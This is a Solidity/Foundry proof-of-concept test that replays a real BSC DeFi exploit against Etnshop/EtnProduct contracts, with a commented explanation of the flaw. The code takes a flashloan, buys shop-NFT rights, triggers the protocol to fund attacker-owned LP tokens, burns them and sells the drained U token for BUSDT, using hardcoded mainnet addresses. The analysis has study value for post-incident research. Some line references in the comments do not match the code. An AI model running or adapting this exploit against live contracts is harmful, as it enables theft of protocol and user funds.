pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo -- Total Lost : ~3074 USD
// TX : https://app.blocksec.com/explorer/tx/bsc/0x72321a3b50bb68ac3b46b0ab973b0e87b6c48ab73d23c4ba2cb73527f978d995
// Attacker : https://bscscan.com/address/0xde703797fe9219b0485fb31eda627aa182b1601e
// Attack Contract : https://bscscan.com/address/0x178bf96e303fb31aef1b586271a63acd33e4eaf7
// GUY : https://x.com/BeosinAlert/status/1555439220474642432

interface Etnshop {
    function invite(address to, uint256 commId) external;
    function mint(uint256 commId, string memory name, string memory logo) external returns (uint256);
}

interface Etnnft is IERC721 {
    function mintETN(string memory uri, string memory name, string memory cid) external payable;
}

interface EtnProduct {
    function newProduct(
        uint256 commId,
        uint256 shopId,
        uint256 price,
        string memory name,
        string memory video
    ) external;
}

interface Umarket {
    function saleU(
        uint256 _amount
    ) external;
}

contract Exploit is Test {
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IERC20 BUSDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IPancakePair Pair = IPancakePair(0xc9053B00720EB661BBdDC7BD6abA1d222aAd5a71);
    IERC20 U = IERC20(0xaa33085e8Fa2CB903157324603E4601299E5dA06);
    Etnshop Shop = Etnshop(0xBceF2955C8955342E9CC92A090bDaEcFF8c562F8);
    Etnnft NFT = Etnnft(0x48835A9065AF7315916ADfc1f952b7aBebdBFd62);
    EtnProduct etnproduct = EtnProduct(0x1292267f726e6F313972ec4e14578735473e1649);
    Umarket Market = Umarket(0xc0e8D30D2ead2C324b3f1A8386992Ba1Be534CbF);
    address constant dodo = 0x52D1C9E81D2bacDAe4c0E6815E63Db8EFBA5fD37;
    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);

    function setUp() external {
        cheats.createSelectFork("http://127.0.0.1:8546", 20_147_974);
        deal(address(BUSDT), address(this), 0 ether);
    }

    function testExploit() external {
        emit log_named_decimal_uint("[Begin] Attacker BUSDT before exploit", BUSDT.balanceOf(address(this)), 18);

        DVM(dodo).flashLoan(0, 9400 * 1e18, address(this), "0x123");

        emit log_named_decimal_uint("[End] Attacker BUSDT after exploit", BUSDT.balanceOf(address(this)), 18);
    }

    function DVMFlashLoanCall(address a, uint256 b, uint256 c, bytes memory d) public {
        approveAll();
        swap_token_to_token(address(BUSDT), address(WBNB), 7380 ether);

        NFT.mintETN{value: 24.15458972 ether}("fw", "sb", "jb");
        Shop.invite(address(this), 11);
        Shop.mint(11, "fw", "sb");

        etnproduct.newProduct(11, 0, 10_000_000_000, "jb", "sb");

        Pair.transfer(address(Pair), 600_000 ether);

        Pair.burn(address(this));

        U.approve(address(Market), 9_999_999 ether);

        Market.saleU(11_253_734_856_316_884_358_000);

        BUSDT.transfer(address(msg.sender), c);
    }

    // VULNERABILITY: Protocol-Funded Liquidity Theft via Misassigned LP Tokens in newProduct
    // Detailed explanation:
    // The core bug lives in EtnProduct.newProduct() + addLiquidity() [sources/EtnProduct_129226/EtnProduct.sol:102,118].
    // - EtnProduct holds a large balance of the protocol's U token (0xaa33...).
    // - Anyone can cheaply acquire "upload rights" by: 1) mintETN (comm NFT, payable in BNB), 2) invite(self, commId) [requires owning the comm], 3) shop.mint(commId,...) paying 1998 USDT. This gives ownership of shop NFT tokenId=commId*100+shopId (shopId starts at 0).
    // - canUploadProduct(to,comm,shop) simply returns shopNft.ownerOf(tokenId)==to [EtnShop:218].
    // - newProduct then: creates product ERC20 via factory.createContract(name,name,bytes32(shopTokenId)), records it, then unconditionally calls addLiquidity(erc20Addr).
    // - addLiquidity does: U.approve(router,700k), token.approve, router.addLiquidity(U, token, 700k,700k,..., msg.sender /*attacker*/, ts).
    //   The router transferFroms the 700k U FROM EtnProduct (the protocol) and 700k new-tokens (freshly created supply held by EtnProduct) INTO the pair.
    //   LP tokens are minted to the 'to' = attacker, not owner or contract.
    // - Because the attacker now owns the LP, they can perform the classic "send LP to pair + burn" to redeem the reserves:
    //   Pair.transfer(Pair, 600k*1e18); Pair.burn(attacker)  [uses internal balanceOf[pair] as liquidity to burn, sends back proportional reserves = nearly all the 700k U + tokens].
    // - Recovered U is then dumped into UMarket.saleU(large) which does U.transferFrom(attacker, market, cost) and market sends USDT back (at salePrice = 10/9 ratio).
    // Code references in PoC: lines 64 (newProduct), 74 (Pair.transfer), 76 (burn), 78-79 (saleU), 48 (hardcoded Pair addr which is the pair created for this U+newtoken), 55 (EtnProduct addr), 40 (U addr).
    // Why works: 1) LP recipient is attacker not protocol, 2) no timelock or min-LP retention, 3) bootstrap always uses protocol U not caller funds, 4) permissioning via buyable shop-NFT is insufficient for a privileged economic action.
    // Impact: Theft of protocol U liquidity (converted to ~3074 USD profit after costs). Flashloan used to front the small setup cost.
    // EXPLOIT STEPS:
    // 1. Flashloan 9400 BUSDT from DODO DVM (line 58).
    // 2. Swap 7380 BUSDT->WBNB (line 64) to fund BNB for NFT mint + keep BUSDT for shop mint cost.
    // 3. approveAll() for max allowances (line 63).
    // 4. NFT.mintETN{value}(...) to mint a community NFT (line 66).
    // 5. Shop.invite(this,11); Shop.mint(11,"fw","sb") -> self-grant shop NFT ownership for comm=11/shop=0 (lines 67-68).
    // 6. etnproduct.newProduct(11,0,1e10,"jb","sb") -> triggers protocol to seed 700k U into attacker-owned LP pair (line 71).
    // 7. Pair.transfer(Pair,600k ether); Pair.burn(this) -> redeem ~606k U + product tokens (lines 74-76).
    // 8. U.approve(Market); Market.saleU(11.25e21) -> exchange U for BUSDT via market (lines 78-79).
    // 9. Repay flashloan (line 81). Attacker profits net after costs.
    // Interface definitions (local in this file): Etnshop, Etnnft, EtnProduct, Umarket (lines 14-35).


    function swap_token_to_token(address a, address b, uint256 amount) internal {
        IERC20(a).approve(address(Router), amount);
        address[] memory path = new address[](2);
        path[0] = address(a);
        path[1] = address(b);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(amount, 0, path, address(this), block.timestamp);
    }

    function approveAll() internal {
        WBNB.approve(address(Shop), type(uint256).max);
        WBNB.approve(address(NFT), type(uint256).max);
        BUSDT.approve(address(Shop), type(uint256).max);
        BUSDT.approve(address(NFT), type(uint256).max);
    }

    function onERC721Received(
        address _operator,
        address _from,
        uint256 _tokenId,
        bytes calldata _data
    ) external returns (bytes4) {
        return this.onERC721Received.selector;
    }
}
